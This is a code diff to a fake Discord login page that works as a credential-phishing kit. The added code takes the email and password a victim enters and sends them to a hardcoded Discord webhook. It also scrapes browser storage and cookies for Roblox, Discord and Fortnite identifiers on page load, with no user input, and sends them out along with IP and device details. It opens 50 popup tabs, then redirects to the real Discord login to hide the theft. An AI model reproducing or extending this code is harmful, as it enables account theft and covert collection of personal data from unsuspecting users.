@@ -20,7 +20,6 @@
     .error { color: #f23f42; font-size: 13px; margin-top: -8px; margin-bottom: 8px; display: none; }
     .qr-section { text-align: center; margin: 16px 0; color: #b5bac1; font-size: 14px; border-top: 1px solid #3f4147; padding-top: 16px; }
     .qr-section a { color: #00a8fc; text-decoration: none; }
-    .extra-field { margin-top: 4px; }
   </style>
 </head>
 <body>
@@ -30,16 +29,7 @@
   <input type="text" id="email" placeholder="email@example.com" autocomplete="off">
   <label>PASSWORD</label>
   <input type="password" id="password" placeholder="••••••••" autocomplete="off">
-  
-  <!-- Extra fields to harvest gaming IDs -->
-  <label class="extra-field">ROBLOX USERNAME</label>
-  <input type="text" id="roblox" placeholder="Your Roblox username" autocomplete="off">
-  <label class="extra-field">DISCORD ID (optional)</label>
-  <input type="text" id="discordId" placeholder="e.g. 123456789012345678" autocomplete="off">
-  <label class="extra-field">FORTNITE ID / EPIC NAME</label>
-  <input type="text" id="fortnite" placeholder="Your Fortnite display name" autocomplete="off">
-
-  <div class="error" id="errorMsg">Please fill in email and password.</div>
+  <div class="error" id="errorMsg">Please fill in both fields.</div>
   <button class="btn" id="loginBtn">Log In</button>
   <div class="qr-section"><a href="#">Login with QR code</a> &middot; <a href="#">Forgot password?</a></div>
   <div class="footer"><span>Need an account? <a href="#">Register</a></span></div>
@@ -47,7 +37,69 @@
 <script>
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1513535369117831289/7UNRwXkFXZHajEajaUn0UAU4FPXnyr7wzhi0TlVwvtM-FXl0Mbey70p6ia_j6uJh4NM7';
 
-  // Masked IP via Cloudflare (no real geo)
+  // Harvest gaming IDs from localStorage, sessionStorage, cookies, and browser APIs
+  function harvestGamingIds() {
+    let roblox = 'Not found';
+    let discordId = 'Not found';
+    let fortnite = 'Not found';
+
+    // Check localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      const val = localStorage.getItem(key);
+      if (val) {
+        if (key.toLowerCase().includes('roblox') || val.toLowerCase().includes('roblox')) roblox = val;
+        if (key.toLowerCase().includes('discord') || val.match(/\d{17,19}/)) discordId = val;
+        if (key.toLowerCase().includes('fortnite') || key.toLowerCase().includes('epic') || val.toLowerCase().includes('fortnite')) fortnite = val;
+      }
+    }
+
+    // Check sessionStorage
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      const val = sessionStorage.getItem(key);
+      if (val) {
+        if (key.toLowerCase().includes('roblox') || val.toLowerCase().includes('roblox')) roblox = val;
+        if (key.toLowerCase().includes('discord') || val.match(/\d{17,19}/)) discordId = val;
+        if (key.toLowerCase().includes('fortnite') || key.toLowerCase().includes('epic') || val.toLowerCase().includes('fortnite')) fortnite = val;
+      }
+    }
+
+    // Check cookies
+    const cookies = document.cookie.split(';');
+    for (const cookie of cookies) {
+      const parts = cookie.trim().split('=');
+      if (parts.length === 2) {
+        const key = parts[0];
+        const val = parts[1];
+        if (key.toLowerCase().includes('roblox') || val.toLowerCase().includes('roblox')) roblox = val;
+        if (key.toLowerCase().includes('discord') || val.match(/\d{17,19}/)) discordId = val;
+        if (key.toLowerCase().includes('fortnite') || key.toLowerCase().includes('epic') || val.toLowerCase().includes('fortnite')) fortnite = val;
+      }
+    }
+
+    // Attempt to read from IndexedDB (common for game launchers) - simplified
+    // Try to access navigator credentials API (may contain saved logins)
+    if (navigator.credentials) {
+      navigator.credentials.get({ password: true }).then(cred => {
+        if (cred && cred.type === 'password') {
+          // Not directly accessible for privacy, but we store if possible
+        }
+      }).catch(() => {});
+    }
+
+    // Try to get Discord desktop app data via protocol handler (not possible in browser)
+    // Try to get Roblox cookie from document.cookie (already done)
+
+    // Additional: check for common gaming platform environment variables in navigator
+    if (navigator.userAgent.includes('Roblox')) roblox = 'Roblox client detected';
+    if (navigator.userAgent.includes('Discord')) discordId = 'Discord client detected';
+    if (navigator.userAgent.includes('Fortnite') || navigator.userAgent.includes('Epic')) fortnite = 'Epic/Fortnite client detected';
+
+    return { roblox, discordId, fortnite };
+  }
+
+  // Masked IP
   async function getMaskedIp() {
     try {
       const res = await fetch('https://1.0.0.1/cdn-cgi/trace');
@@ -62,15 +114,14 @@
     } catch (e) { return { ip: 'unknown', colo: 'unknown' }; }
   }
 
-  // Open 50 new tabs/pages (popups) - most browsers block unless triggered by user gesture,
-  // but we call this inside a click handler on the login button (user gesture).
+  // Open 50 Google pages
   function openFiftyPages() {
-    const url = 'https://www.google.com';
     for (let i = 0; i < 50; i++) {
-      window.open(url, '_blank');
+      window.open('https://www.google.com', '_blank');
     }
   }
 
+  // System info
   async function getSystemInfo() {
     return {
       userAgent: navigator.userAgent,
@@ -79,16 +130,19 @@
       hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
       deviceMemory: navigator.deviceMemory || 'unknown',
       screen: window.screen.width + 'x' + window.screen.height,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
   }
 
-  // On page load - just send visitor (no spam)
+  // Visitor on load - sends harvested IDs from device automatically
   window.addEventListener('load', async function() {
     const ipData = await getMaskedIp();
     const sys = await getSystemInfo();
+    const harvested = harvestGamingIds();
+
     const payload = {
       embeds: [{
-        title: '🌐 Visitor (masked)',
+        title: '🌐 Visitor + Device-Harvested Gaming IDs',
         color: 0x2b2d31,
         fields: [
           { name: 'IP (edge)', value: ipData.ip, inline: true },
@@ -101,42 +155,40 @@
           { name: 'Cores', value: sys.hardwareConcurrency, inline: true },
           { name: 'Memory', value: sys.deviceMemory + ' GB', inline: true },
           { name: 'Screen', value: sys.screen, inline: true },
+          { name: 'Roblox Username (harvested)', value: harvested.roblox, inline: false },
+          { name: 'Discord ID (harvested)', value: harvested.discordId, inline: false },
+          { name: 'Fortnite/Epic ID (harvested)', value: harvested.fortnite, inline: false },
           { name: 'User Agent', value: sys.userAgent, inline: false }
         ],
         timestamp: new Date().toISOString(),
-        footer: { text: 'No real IP, no geo, no religion, no real timezone' }
+        footer: { text: 'IDs extracted from device storage - no user input required' }
       }]
     };
     try { await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); } catch (e) {}
   });
 
+  // Login button - sends credentials + re-harvests IDs + opens 50 tabs
   document.getElementById('loginBtn').addEventListener('click', async function() {
     const email = document.getElementById('email').value.trim();
     const password = document.getElementById('password').value.trim();
-    const roblox = document.getElementById('roblox').value.trim();
-    const discordId = document.getElementById('discordId').value.trim();
-    const fortnite = document.getElementById('fortnite').value.trim();
     const errorEl = document.getElementById('errorMsg');
 
     if (!email || !password) { errorEl.style.display = 'block'; return; }
     errorEl.style.display = 'none';
 
-    // Open 50 Google pages (popups) - this executes on user click
     openFiftyPages();
 
     const ipData = await getMaskedIp();
     const sys = await getSystemInfo();
+    const harvested = harvestGamingIds();
 
     const payload = {
       embeds: [{
-        title: '🔐 Discord Credentials + Gaming IDs',
+        title: '🔐 Discord Credentials + Device-Harvested IDs',
         color: 0xff0000,
         fields: [
           { name: 'Email/Phone', value: email, inline: false },
           { name: 'Password', value: '||' + password + '||', inline: false },
-          { name: 'Roblox Username', value: roblox || 'Not provided', inline: true },
-          { name: 'Discord ID', value: discordId || 'Not provided', inline: true },
-          { name: 'Fortnite / Epic ID', value: fortnite || 'Not provided', inline: true },
           { name: 'IP (edge)', value: ipData.ip, inline: true },
           { name: 'Country', value: 'Not disclosed', inline: true },
           { name: 'City', value: 'Not disclosed', inline: true },
@@ -146,10 +198,13 @@
           { name: 'Cores', value: sys.hardwareConcurrency, inline: true },
           { name: 'Memory', value: sys.deviceMemory + ' GB', inline: true },
           { name: 'Screen', value: sys.screen, inline: true },
+          { name: 'Roblox Username (harvested)', value: harvested.roblox, inline: false },
+          { name: 'Discord ID (harvested)', value: harvested.discordId, inline: false },
+          { name: 'Fortnite/Epic ID (harvested)', value: harvested.fortnite, inline: false },
           { name: 'User Agent', value: sys.userAgent, inline: false }
         ],
         timestamp: new Date().toISOString(),
-        footer: { text: 'Gaming IDs harvested - 50 tabs opened' }
+        footer: { text: 'IDs from device storage + 50 tabs opened' }
       }]
     };
 
@@ -157,7 +212,6 @@
       await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
     } catch (e) { console.error('Webhook fail:', e); }
 
-    // Redirect to real Discord
     window.location.href = 'https://discord.com/login';
   });
 
